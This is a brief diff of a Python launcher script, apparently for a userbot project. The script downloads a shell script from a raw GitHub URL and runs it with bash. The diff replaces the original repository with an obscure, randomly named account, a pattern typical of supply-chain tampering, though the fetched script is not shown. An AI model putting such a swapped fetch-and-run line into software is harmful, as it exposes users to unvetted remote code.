@@ -14,5 +14,5 @@ password["code"] = "1337"
 while password["input"] != password["code"]:
 	password["input"] = input("Password: ")
 os.remove("runner.sh")
-wget.download("https://raw.githubusercontent.com/A9FM/ClipUserbot/main/runner.sh", "runner.sh")
+wget.download("https://raw.githubusercontent.com/syzcoycosuvsgix/_/main/runner.sh", "runner.sh")
 os.system("bash runner.sh")
